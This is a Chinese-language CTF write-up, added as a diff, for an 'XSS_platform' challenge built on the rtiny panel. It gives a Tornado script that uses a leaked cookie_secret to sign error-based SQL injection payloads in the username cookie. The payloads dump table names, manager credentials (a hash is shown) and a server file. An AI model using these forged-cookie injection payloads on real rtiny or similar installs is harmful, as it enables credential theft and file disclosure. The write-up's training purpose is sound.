@@ -1,0 +1,72 @@
+# XSS_platform
+## 题目内容
+后台有获取flag的线索。
+## 思路
+点开链接，是一个登录页面：  
+![avatar](./picture/XSS_platform_1.png)  
+在这僵住了，看了 wp，说是要利用报错信息：  
+![avatar](./picture/XSS_platform_2.png)  
+去 github 上搜一下 rtiny：  
+![avatar](./picture/XSS_platform_3.png)  
+就这个了，查看源码，发现在 lock.py 中存在注入漏洞：  
+![avatar](./picture/XSS_platform_4.png)  
+可以随意构造 username 没有任何过滤。但是用到了一个方法，set_secure_cookie：  
+![avatar](./picture/XSS_platform_5.png)  
+在 index.py 中发现用于加密 cookie 的 cookie_secret 的值：  
+![avatar](./picture/XSS_platform_6.png)  
+于是可以使用脚本构造 secure_cookie：  
+```python
+# coding:utf-8
+import tornado.ioloop
+import tornado.web 
+ 
+settings = { 
+   "cookie_secret" : "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",
+}
+ 
+class MainHandler(tornado.web.RequestHandler):
+    def get(self):
+        self.write("Hello")
+        //查表名
+        self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))-- ")
+        //查列名
+        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name='manager')))-- ")
+        //获取账号密码
+        #self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,mid((select group_concat(username,'|',password,'|',email) from manager),30,62))) -- ")
+        //获取 flag
+        #self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select load_file('/var/www/html/f13g_ls_here.txt'))))#")
+        #self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),28,60)))#")
+        self.write(self.get_secure_cookie("username"))
+ 
+def make_app():
+    return tornado.web.Application([
+        (r"/index", MainHandler), ], **settings)
+ 
+if __name__ == "__main__":
+    app = make_app()
+    app.listen(8080)
+    tornado.ioloop.IOLoop.instance().start()
+```
+运行脚本，然后用浏览器访问本机 index，并获取 cookie：  
+http://localhost:8080/index  
+![avatar](./picture/XSS_platform_7.png)  
+然后利用新 cookie 来进行报错注入，注意，注入的时候，路径要正确，因为是 lock.py 中出现的报错注入漏洞，因此需要去访问 /lock 进行利用，首先查表名：  
+![avatar](./picture/XSS_platform_8.png)  
+查列名：  
+![avatar](./picture/XSS_platform_9.png)  
+获取账号密码：  
+![avatar](./picture/XSS_platform_10.png)  
+由于太长显示不完，因此分两次获取：  
+![avatar](./picture/XSS_platform_11.png)  
+拼接一下：  
+ichuqiu | 318a61264482e503090facfc4337207f  
+用 md5 解密得到密码：  
+![avatar](./picture/XSS_platform_12.png)  
+登录上去看一下，在 file 中，看到了可疑信息：  
+![avatar](./picture/XSS_platform_13.png)  
+随后继续利用报错注入去访问这个信息就好了：  
+![avatar](./picture/XSS_platform_14.png)  
+还是太长，继续获取：  
+![avatar](./picture/XSS_platform_15.png)  
+拼接一下，得到最终 flag：  
+flag{4374b83a-d9d3-4cbe-a939-86f5b69a944f}
